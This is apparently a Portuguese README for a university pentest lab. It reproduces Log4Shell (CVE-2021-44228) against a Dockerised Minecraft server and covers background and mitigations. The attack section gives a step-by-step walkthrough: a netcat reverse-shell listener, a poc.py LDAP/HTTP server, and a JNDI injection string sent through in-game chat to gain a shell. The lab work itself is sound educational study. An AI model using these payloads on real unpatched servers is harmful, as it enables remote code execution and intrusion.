# Exploração da Vulnerabilidade Log4Shell em um servidor Minecraft

## Membros do Grupo

- **Pedro Kenzo Muramatsu Carmo** - 11796451
- **Giovanni Shibaki Camargo** - 11796444
- **Matheus Giraldi Alvarenga** - 12543669
- **Gustavo Henrique Brunelli** - 11801053

- [Vídeo de Apresentação](https://youtu.be/Fwg9idz1wvM)

## Introdução

Este repositório contém o trabalho de pentest realizado para a disciplina SSC0900 - Engenharia de Segurança, sob orientação do Prof. Dr. Rodolfo Ipolito Meneguette. O objetivo deste projeto é explorar a vulnerabilidade Log4Shell (CVE-2021-44228) em um servidor Minecraft e demonstrar a execução de um exploit, bem como discutir as medidas de mitigação e segurança.

## Vulnerabilidade Log4Shell

### Origem

A vulnerabilidade Log4Shell, identificada como CVE-2021-44228, surgiu em dezembro de 2021 e impactou o Log4j, uma biblioteca de registro em log amplamente utilizada em aplicações Java. A Log4j é mantida pela Apache Software Foundation e é usada para registrar eventos, informações e diagnósticos, sendo fundamental para a depuração e monitoramento de sistemas.

### Funcionamento

A Log4Shell explora uma falha específica no Log4j que permite a execução remota de código (RCE - Remote Code Execution). A vulnerabilidade ocorre devido a uma função da biblioteca Log4j que resolve strings que contêm certas sequências de caracteres especiais, conhecidas como JNDI (Java Naming and Directory Interface).

Quando uma entrada de log contém uma string como `${jndi:ldap://malicious-server.com/a}`, o Log4j tenta resolver essa string e, inadvertidamente, faz uma solicitação JNDI ao servidor remoto presente na string maliciosa. Se esse servidor remoto for malicioso, ele pode retornar um payload que será executado na máquina que está rodando a aplicação, concedendo ao atacante o controle total do sistema.

### Perigos e Usos

Os perigos associados à vulnerabilidade Log4Shell incluem:

1. **Instalação de Malwares:** O atacante pode enviar um payload que baixa e instala malware na máquina alvo. Esse malware pode ser um trojan, ransomware, ou qualquer outro tipo de software malicioso.
2. **Mineração de Criptomoedas:** Um payload pode instalar um minerador de criptomoedas, que utiliza os recursos da máquina comprometida para minerar moedas digitais.
3. **Criação de Backdoors:** O atacante pode instalar um backdoor que permite acesso contínuo ao sistema comprometido, incluindo a criação de novas contas de usuário com privilégios elevados.
4. **Roubo de Dados:** O payload pode exfiltrar dados sensíveis do sistema, enviando-os de volta ao servidor do atacante.
5. **Execução de Comandos Arbitrários:** Permite ao atacante executar comandos arbitrários no sistema comprometido, podendo modificar arquivos ou desativar serviços críticos.

### Resolução

A Apache Software Foundation respondeu rapidamente ao lançar patches para corrigir a vulnerabilidade. A atualização para o Log4j versão 2.15.0, lançada em 6 de dezembro de 2021, desativou a funcionalidade de resolução JNDI por padrão e implementou controles mais rigorosos.

Medidas de mitigação adicionais incluem:

- Configurar firewalls e proxies para bloquear requisições JNDI externas.
- Desativar a funcionalidade JNDI manualmente, configurando parâmetros de inicialização da aplicação.

## Roteiro de Implementação

### Preparação do Ambiente

1. **Configuração da Máquina Virtual:**
   - Crie uma máquina virtual (VM) utilizando um serviço como VirtualBox ou VMware.
   - Instale um sistema operacional Linux (Ubuntu ou Kali Linux) na VM, dedicando ao menos 4GB de memória RAM, 20GB de armazenamento e 4 núcleos de processamento.

2. **Instalação do Docker:**
   - Abra o terminal e instale o Docker com os seguintes comandos:
     ```sh
     sudo apt update
     sudo apt install -y apt-transport-https ca-certificates curl software-properties-common
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
     sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
     sudo apt update
     sudo apt install -y docker-ce
     sudo systemctl status docker
     ```

3. **Instalação do Docker Compose:**
   - Instale o Docker Compose para facilitar a gestão dos containers:
     ```sh
     sudo curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
     sudo chmod +x /usr/local/bin/docker-compose
     docker-compose --version
     ```

### Configuração do Servidor Minecraft Vítima

1. **Clone do Repositório:**
   - Clone o repositório que contém a configuração do servidor Minecraft vulnerável e vá para a pasta `vitima`:
     ```sh
     git clone git@github.com:giovanni-shibaki/SSC0900_Minecraft_Log4Shell.git
     cd SSC0900_Minecraft_Log4Shell/victim
     ```

2. **Configuração do Container Docker:**
   - No diretório do projeto clonado, construa e inicie o container Docker para simular o servidor Minecraft vulnerável:
     ```sh
     docker build . -t minecraft-demo
     docker run –name servidor-vitima -p 25565:25565 minecraft-demo
     ```

### Configuração do Sistema Atacante e Cliente Minecraft

1. **Preparação do Ambiente do Atacante:**
   - Entre na pasta `attacker` do repositório clonado:
     ```sh
     cd ../attacker
     ```

2. **Instalação de Dependências do Python:**
   - Instale os requerimentos e dependências do Python:
     ```sh
     pip install -r requirements.txt
     ```

3. **Inicialização do Netcat Listener:**
   - Inicie o Netcat listener para aceitar a conexão de shell reversa:
     ```sh
     nc -lvnp 9001
     ```

4. **Execução do Script Python:**
   - Execute o script Python para configurar e iniciar os servidores LDAP e HTTP:
     ```sh
     python3 poc.py --userip localhost --webport 8000 --lport 9001
     ```

5. **Conexão ao Servidor Minecraft:**
   - Acesse o servidor Minecraft vítima através de um cliente Minecraft.

### Execução do Ataque

1. **Envio da String Maliciosa:**
   - Envie, pelo chat do jogo, a seguinte mensagem:
     ```sh
     ${jndi:ldap://<ip-do-host>:1389/a}
     ```

2. **Verificação do Acesso:**
   - Verifique o terminal onde o Netcat Listener foi iniciado e observe que você terá acesso total ao ambiente shell do servidor vítima.

## Mitigação

Para mitigar a vulnerabilidade Log4Shell, siga estas estratégias:

1. **Atualização e Patching:**
   - Atualize a biblioteca Log4j para a versão 2.15.0 ou superior.

2. **Desativação de Funcionalidades Vulneráveis:**
   - Desative a resolução de mensagens que incluem JNDI configurando a propriedade do sistema:
     ```sh
     -Dlog4j2.formatMsgNoLookups=true
     ```

3. **Configuração Segura do Log4j:**
   - Limite o acesso JNDI e implemente validações e filtragem rigorosas nas entradas registradas pelo Log4j.

4. **Monitoramento e Detecção:**
   - Utilize sistemas de detecção e prevenção de intrusões (IDS/IPS) e ative o monitoramento contínuo dos logs de aplicações.

5. **Hardening de Sistema:**
   - Configure sistemas e aplicações para operar com o menor nível de privilégio necessário e execute serviços críticos em ambientes isolados.

## Referências

- [Log4Shell: CVE-2021-44228](https://nordvpn.com/wp-content/uploads/2020/02/Penetration-test-Featured-1.jpg)
- [Repositório GitHub](https://github.com/giovanni-shibaki/SSC0900_Minecraft_Log4Shell)
- [Arquivos Necessários 1](https://drive.google.com/file/d/1JTHU1uTIcG6qWSNPLhUaYtvS9_jMaGcc/view?usp=sharing)
- [Arquivos Necessários 2](https://drive.google.com/file/d/1J5Fy97HpteE7w7ALnNAYKO1WKtfO1av_/view?usp=sharing)



